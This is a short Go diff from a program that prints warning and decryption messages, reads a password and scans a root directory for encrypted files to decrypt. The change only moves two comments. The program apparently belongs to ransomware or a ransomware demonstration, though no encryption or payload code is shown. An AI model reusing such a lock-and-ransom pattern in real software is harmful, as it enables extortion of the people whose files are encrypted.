@@ -113,13 +113,12 @@ func main() {
 	color.Info.Println(sub)
 	// Warning
 	color.Warn.Println(warn)
-	// Prompt user for password to decrypt
 	color.Warn.Println(decrypt)
+	// Prompt user for password to decrypt
 	color.Warn.Println(message)
 
 	var password string
 	fmt.Scanln(&password)
-	// Decrypt files, if valid password is provided.
 	efs := files.NewFiles(rootDir, fileExtensions, size)
 	encryptedfiles, _ := efs.ScanToDecrypt()
 
